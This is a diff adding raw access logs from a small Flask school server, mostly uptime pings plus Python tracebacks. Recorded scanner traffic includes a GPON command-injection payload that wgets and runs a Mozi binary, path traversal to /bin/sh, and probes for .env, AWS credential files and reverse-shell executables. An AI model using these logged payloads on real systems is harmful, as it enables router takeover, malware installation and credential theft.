@@ -1051,6 +1051,457 @@ down below you can see some more infomation on the code and more will be added!
  208.115.199.27 - - 16/Jun/2022 17:33:24 HEAD / HTTP/1.1 200 -\n
  208.115.199.27 - - 16/Jun/2022 17:38:24 HEAD / HTTP/1.1 200 -\n
  208.115.199.27 - - 16/Jun/2022 17:43:24 HEAD / HTTP/1.1 200 -\n
+ 96.44.162.70 - - 16/Jun/2022 17:45:45 HEAD /robots.txt HTTP/1.0 404 -\n
+ 208.115.199.27 - - 16/Jun/2022 17:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 17:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 17:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:18:24 HEAD / HTTP/1.1 200 -\n
+ 185.7.214.104 - - 16/Jun/2022 18:18:53 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:33:24 HEAD / HTTP/1.1 200 -\n
+ 144.172.73.66 - - 16/Jun/2022 18:33:29 GET /account.exe HTTP/1.1 404 -\n
+ 195.239.51.78 - - 16/Jun/2022 18:34:37 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 144.172.73.66 - - 16/Jun/2022 18:35:39 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 18:53:24 HEAD / HTTP/1.1 200 -\n
+ 104.217.249.182 - - 16/Jun/2022 18:57:59 POST /boaform/admin/formLogin HTTP/1.1 404 -\n
+ 104.217.249.182 - - 16/Jun/2022 18:57:59 code 400
+ message Bad request syntax (username=admin&psd=Feefifofum)\n
+ 104.217.249.182 - - 16/Jun/2022 18:57:59 None /boaform/admin/formLogin HTTP/0.9 HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 16/Jun/2022 18:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:08:24 HEAD / HTTP/1.1 200 -\n
+ 185.7.214.104 - - 16/Jun/2022 19:08:51 POST /cgi-bin/../../../../bin/sh HTTP/1.1 404 -\n
+ 92.118.160.9 - - 16/Jun/2022 19:09:26 GET / HTTP/1.0 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:18:24 HEAD / HTTP/1.1 200 -\n
+ 34.140.248.32 - - 16/Jun/2022 19:21:58 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:38:24 HEAD / HTTP/1.1 200 -\n
+ 185.7.214.104 - - 16/Jun/2022 19:42:24 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:43:24 HEAD / HTTP/1.1 200 -\n
+ 194.186.142.153 - - 16/Jun/2022 19:46:13 GET /account.exe HTTP/1.1 404 -\n
+ 2.57.168.55 - - 16/Jun/2022 19:47:07 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 213.33.190.159 - - 16/Jun/2022 19:47:39 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 19:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:18:24 HEAD / HTTP/1.1 200 -\n
+ 185.7.214.104 - - 16/Jun/2022 20:18:31 GET /actuator/gateway/routes HTTP/1.1 404 -\n
+ 45.129.18.84 - - 16/Jun/2022 20:18:45 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:28:24 HEAD / HTTP/1.1 200 -\n
+ 109.237.103.9 - - 16/Jun/2022 20:28:47 GET /.env HTTP/1.1 404 -\n
+ 109.237.103.9 - - 16/Jun/2022 20:28:47 code 400
+ message Bad request version (l\\x00b\\x13\\x02\\x13\\x03\\x13\\x01À
+À0À+À/Ì©Ì¨\\x00£\\x00\\x9f\\x00¢\\x00\\x9eÌªÀ¯À\\xadÀ$À(À)\n
+ 109.237.103.9 - - 16/Jun/2022 20:28:47 \x16\x03\x01\x01D\x01\x00\x01@\x03\x032\x16\x1f3-\x92Øý\x9a\x03\x1dõ$\x0fß\x9cÔYcû\xa0\x81_\x19\x84=° ¡\x14f |ê\x9b(\x06\x801lDVq¢\x8dwZª\x13Ûª\x00ßÞ¯xýXÑ\\x82\x8a\x1fl\x00b\x13\x02\x13\x03\x13\x01À
+À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 16/Jun/2022 20:33:24 HEAD / HTTP/1.1 200 -\n
+ 120.86.255.246 - - 16/Jun/2022 20:34:18 POST /GponForm/diag_Form?images/ HTTP/1.1 405 -\n
+ 120.86.255.246 - - 16/Jun/2022 20:34:19 code 400
+ message Bad request syntax (XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0)\n
+ 120.86.255.246 - - 16/Jun/2022 20:34:19 None /GponForm/diag_Form?images/ HTTP/0.9 HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 16/Jun/2022 20:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 20:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:08:24 HEAD / HTTP/1.1 200 -\n
+ 181.214.206.161 - - 16/Jun/2022 21:12:08 OPTIONS / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:18:24 HEAD / HTTP/1.1 200 -\n
+ 109.237.103.118 - - 16/Jun/2022 21:19:51 GET /.aws/credentials HTTP/1.1 403 -\n
+ 109.237.103.118 - - 16/Jun/2022 21:19:51 code 400
+ message Bad request version (\cZëè\\x94\\x05÷u!¡\\x9a\\xad\\x05\\x8fº\\x9d\\x11yQ>\\x964ý\\x16oR\\x9a<@Ô\\x1a\\x00b\\x13\\x02\\x13\\x03\\x13\\x01À
+À0À+À/Ì©Ì¨\\x00£\\x00\\x9f\\x00¢\\x00\\x9eÌªÀ¯À\\xadÀ$À(À\)\n
+ 109.237.103.118 - - 16/Jun/2022 21:19:51 \x16\x03\x01\x01D\x01\x00\x01@\x03\x03Çô\x1bX>4òËÜ>Âw\x0b \x8e\x8d(\x12\x95aéd=\x94xà©\x01·Ò¦ cZëè\x94\x05÷u!¡\x9a\xad\x05\x8fº\x9d\x11yQ>\x964ý\x16oR\x9a<@Ô\x1a\x00b\x13\x02\x13\x03\x13\x01À
+À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 16/Jun/2022 21:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:43:24 HEAD / HTTP/1.1 200 -\n
+ 200.36.150.8 - - 16/Jun/2022 21:47:40 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 21:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:23:24 HEAD / HTTP/1.1 200 -\n
+ 186.33.71.124 - - 16/Jun/2022 22:26:33 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:33:24 HEAD / HTTP/1.1 200 -\n
+ 167.94.145.58 - - 16/Jun/2022 22:34:04 GET / HTTP/1.1 200 -\n
+ 167.94.145.58 - - 16/Jun/2022 22:34:04 GET / HTTP/1.1 200 -\n
+ 167.94.145.58 - - 16/Jun/2022 22:34:04 code 505
+ message Invalid HTTP version (2.0)\n
+ 167.94.145.58 - - 16/Jun/2022 22:34:04 PRI * HTTP/2.0 HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -\n
+ 208.115.199.27 - - 16/Jun/2022 22:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:43:24 HEAD / HTTP/1.1 200 -\n
+ 95.25.71.83 - - 16/Jun/2022 22:44:26 GET /account.exe HTTP/1.1 404 -\n
+ 93.203.38.167 - - 16/Jun/2022 22:45:29 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 194.186.142.5 - - 16/Jun/2022 22:46:08 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 22:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:28:24 HEAD / HTTP/1.1 200 -\n
+ 45.76.35.236 - - 16/Jun/2022 23:31:32 GET /auth/login HTTP/1.0 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/auth-Aardrijkskunde.txt\n
+ 208.115.199.27 - - 16/Jun/2022 23:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:38:24 HEAD / HTTP/1.1 200 -\n
+ 185.254.196.223 - - 16/Jun/2022 23:39:32 GET /.env HTTP/1.1 404 -\n
+ 185.254.196.223 - - 16/Jun/2022 23:39:34 POST / HTTP/1.1 405 -\n
+ 185.254.196.223 - - 16/Jun/2022 23:39:34 code 400
+ message Bad request syntax (0x%5B%5D=Graber)\n
+ 185.254.196.223 - - 16/Jun/2022 23:39:34 None / HTTP/0.9 HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 16/Jun/2022 23:43:24 HEAD / HTTP/1.1 200 -\n
+ 171.25.193.78 - - 16/Jun/2022 23:46:00 GET /account.exe HTTP/1.1 404 -\n
+ 212.30.36.90 - - 16/Jun/2022 23:47:06 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 45.133.1.84 - - 16/Jun/2022 23:47:28 GET / HTTP/1.1 200 -\n
+ 89.208.29.69 - - 16/Jun/2022 23:47:41 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 16/Jun/2022 23:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:28:24 HEAD / HTTP/1.1 200 -\n
+ 102.67.30.179 - - 17/Jun/2022 00:31:10 code 400
+ message Bad request syntax (SSH-2.0-OpenSSH)\n
+ 102.67.30.179 - - 17/Jun/2022 00:31:10 SSH-2.0-OpenSSH HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 17/Jun/2022 00:33:24 HEAD / HTTP/1.1 200 -\n
+ 96.44.162.190 - - 17/Jun/2022 00:34:15 GET /pv/spa112.cfg HTTP/1.1 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/pv-Aardrijkskunde.txt\n
+ 208.115.199.27 - - 17/Jun/2022 00:38:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:53:24 HEAD / HTTP/1.1 200 -\n
+ 185.220.100.241 - - 17/Jun/2022 00:57:59 GET /account.exe HTTP/1.1 404 -\n
+ 2.57.171.50 - - 17/Jun/2022 00:58:23 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 00:58:24 HEAD / HTTP/1.1 200 -\n
+ 95.25.71.83 - - 17/Jun/2022 00:59:29 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:33:24 HEAD / HTTP/1.1 200 -\n
+ 185.21.216.169 - - 17/Jun/2022 01:38:08 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:38:24 HEAD / HTTP/1.1 200 -\n
+ 104.217.249.182 - - 17/Jun/2022 01:39:20 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 01:53:24 HEAD / HTTP/1.1 200 -\n
+ 198.235.24.5 - - 17/Jun/2022 01:57:44 code 400
+ message Bad request version (À(À$À\\x14À)\n
+ 198.235.24.5 - - 17/Jun/2022 01:57:44 \x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\t\x1e ôNMÈ\w%(\x80`Q\x84t\x94\x96ßgFìÖ`\x87i¿?äÏáB\x00\x00hÌ\x14Ì\x13À/À+À0À
+À\x11À\x07À\À#À\x13À\tÀ(À$À\x14À HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 17/Jun/2022 01:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:08:24 HEAD / HTTP/1.1 200 -\n
+ 192.241.220.237 - - 17/Jun/2022 02:08:59 GET / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:38:24 HEAD / HTTP/1.1 200 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:33 GET /invoker/readonly HTTP/1.1 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/invoker-Aardrijkskunde.txt\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:33 POST /_ignition/execute-solution HTTP/1.1 405 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:33 POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 404 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:34 GET / HTTP/1.1 200 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:34 GET /script HTTP/1.1 404 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:34 GET /login HTTP/1.1 200 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:35 GET /jenkins/login HTTP/1.1 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/jenkins-Aardrijkskunde.txt\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:35 GET /manager/html HTTP/1.1 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/manager-Aardrijkskunde.txt\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:35 GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars0=md5&vars1=ya49gvbe HTTP/1.1 200 -\n
+ 13.235.83.62 - - 17/Jun/2022 02:42:36 GET /users/sign_in HTTP/1.1 500 -\n
+ Traceback (most recent call last):\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2095
+ in __call__\n
+     return self.wsgi_app(environ
+ start_response)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2080
+ in wsgi_app\n
+     response = self.handle_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 2077
+ in wsgi_app\n
+     response = self.full_dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1525
+ in full_dispatch_request\n
+     rv = self.handle_user_exception(e)\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1523
+ in full_dispatch_request\n
+     rv = self.dispatch_request()\n
+   File /usr/local/lib/python3.8/dist-packages/flask/app.py
+ line 1509
+ in dispatch_request\n
+     return self.ensure_sync(self.view_functionsrule.endpoint)(**req.view_args)\n
+   File /root/server/school/server.py
+ line 817
+ in hello\n
+     my_file = open(fkerndoelen/{niveaw}-Aardrijkskunde.txt
+ r)\n
+ FileNotFoundError: Errno 2 No such file or directory: kerndoelen/users-Aardrijkskunde.txt\n
+ 208.115.199.27 - - 17/Jun/2022 02:43:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 02:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:08:24 HEAD / HTTP/1.1 200 -\n
+ 109.237.103.123 - - 17/Jun/2022 03:11:43 GET /.env HTTP/1.1 403 -\n
+ 109.237.103.123 - - 17/Jun/2022 03:11:43 code 400
+ message Bad request version (Ó\\x00b\\x13\\x02\\x13\\x03\\x13\\x01À
+À0À+À/Ì©Ì¨\\x00£\\x00\\x9f\\x00¢\\x00\\x9eÌªÀ¯À\\xadÀ$À(À)\n
+ 109.237.103.123 - - 17/Jun/2022 03:11:43 \x16\x03\x01\x01D\x01\x00\x01@\x03\x03+eöãÏç\x9e\x95\x04ym/ì¥\x08Ù\x9ct:\n
+ \x90\x0e°\x825\x0e4L\x82 òèÊL³çbõ\x14\x1fí\s\x97/\x83W\x82Ô\x942ÀÎ¿ß7âïm¿ Ó\x00b\x13\x02\x13\x03\x13\x01À
+À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À HTTPStatus.BAD_REQUEST -\n
+ 208.115.199.27 - - 17/Jun/2022 03:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:18:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:23:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:28:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:33:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:38:24 HEAD / HTTP/1.1 200 -\n
+ 89.208.29.69 - - 17/Jun/2022 03:42:51 GET /account.exe HTTP/1.1 404 -\n
+ 89.208.29.69 - - 17/Jun/2022 03:43:17 GET /met_https_reverse.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:43:24 HEAD / HTTP/1.1 200 -\n
+ 89.208.29.69 - - 17/Jun/2022 03:44:00 GET /xD.exe HTTP/1.1 404 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:48:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:53:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 03:58:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:03:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:08:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:13:24 HEAD / HTTP/1.1 200 -\n
+ 208.115.199.27 - - 17/Jun/2022 04:18:24 HEAD / HTTP/1.1 200 -\n
